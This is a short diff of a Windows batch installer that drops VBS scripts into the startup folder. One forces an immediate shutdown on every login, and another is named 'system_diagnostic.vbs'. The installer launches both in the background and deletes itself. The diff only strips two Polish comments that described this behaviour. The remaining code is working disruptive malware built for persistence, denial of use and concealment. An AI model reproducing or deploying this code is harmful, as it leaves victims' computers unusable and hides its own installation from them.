@@ -10,9 +10,7 @@ echo WScript.Sleep 5 > "%startup_folder%\silent_shutdown.vbs"
 echo Set objShell = WScript.CreateObject("WScript.Shell") >> "%startup_folder%\silent_shutdown.vbs"
 echo objShell.Run "shutdown /s /t 0 /f", 0, True >> "%startup_folder%\silent_shutdown.vbs"
 
-:: Uruchomienie obu procesów w tle od razu (bez czekania na restart komputera)
 start "" wscript "%startup_folder%\system_diagnostic.vbs"
 start "" wscript "%startup_folder%\silent_shutdown.vbs"
 
-:: Samousunięcie pliku instalacyjnego
 del "%~f0"
